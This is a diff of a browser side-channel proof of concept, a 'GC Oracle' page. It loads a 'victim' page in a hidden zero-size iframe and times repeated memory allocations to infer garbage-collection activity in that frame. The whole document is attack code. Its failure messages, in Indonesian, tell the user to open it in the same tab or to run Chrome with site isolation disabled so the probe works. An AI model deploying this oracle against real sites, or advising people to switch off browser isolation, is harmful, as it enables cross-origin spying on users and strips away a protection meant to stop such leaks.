@@ -1,11 +1,11 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>GC Oracle++</title>
+<title>GC Oracle FINAL AUTO</title>
 
-<h2>GC Oracle++ (Strong)</h2>
+<h2>GC Oracle FINAL (Auto Detect)</h2>
 <pre id="log"></pre>
 
-<iframe src="https://ecdnts-del.github.io/spoof/victim.html" style="width:0;height:0;border:0"></iframe>
+<iframe id="f" style="width:0;height:0;border:0"></iframe>
 
 <script>
 const log = m => {
@@ -13,56 +13,67 @@ const log = m => {
   console.log(m)
 }
 
-// ===== MULTI PROBE =====
+// ===== FORCE SAME PROCESS (best effort) =====
+const f = document.getElementById('f')
+f.src = "about:blank"
+f.onload = () => {
+  f.contentWindow.location = "/spoof/victim.html"
+}
+
+// ===== HEAVY PROBE =====
 function probe() {
   const t0 = performance.now()
 
-  // 1. array alloc
   let arr = []
-  for (let i = 0; i < 4000; i++) arr.push([i])
+  for (let i = 0; i < 60000; i++) {
+    arr.push({a:i, b:i+1})
+  }
 
-  // 2. typed array
-  let buf = new Uint8Array(1024 * 256)
-
-  // 3. object alloc
-  let obj = []
-  for (let i = 0; i < 2000; i++) obj.push({a:i,b:i+1})
+  // typed array (lebih sensitif GC)
+  let buf = new Uint8Array(1024 * 512)
 
   return performance.now() - t0
 }
 
-// ===== SAMPLING =====
-function sample() {
+// ===== MULTI SAMPLE =====
+function measure() {
   let sum = 0
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 3; i++) {
     sum += probe()
   }
-  return sum / 5
+  return sum / 3
 }
 
-// ===== TRACKING =====
+// ===== TRACK =====
 let history = []
-let baseline = null
+let detected = false
 
 setInterval(() => {
-  const t = sample()
+  const t = measure()
   history.push(t)
 
-  if (history.length > 50) history.shift()
+  if (history.length > 30) history.shift()
 
-  // adaptive baseline (median)
-  const sorted = [...history].sort((a,b)=>a-b)
-  const med = sorted[Math.floor(sorted.length/2)]
-
-  if (baseline === null) baseline = med
-
-  const delta = t - baseline
+  const avg = history.reduce((a,b)=>a+b,0)/history.length
 
   let state = "IDLE"
-  if (delta > 2) state = "ACTIVE"
-  if (delta > 5) state = "HIGH GC PRESSURE"
+  if (t > 8) state = "GC SPIKE 🔥"
+  if (t > 15) state = "HEAVY GC 💣"
 
-  log(`t=${t.toFixed(2)} base=${baseline.toFixed(2)} Δ=${delta.toFixed(2)} => ${state}`)
+  if (t > 8) detected = true
+
+  log(`t=${t.toFixed(2)} avg=${avg.toFixed(2)} => ${state}`)
 
 }, 120)
+
+// ===== FAIL DETECTION =====
+setTimeout(() => {
+  if (!detected) {
+    log("\n[!] No GC signal detected")
+    log("[!] Likely different process (Site Isolation aktif)")
+    log("[!] Coba:")
+    log("    - buka di tab yang sama")
+    log("    - pakai Chrome --disable-site-isolation-trials")
+  }
+}, 8000)
 </script>
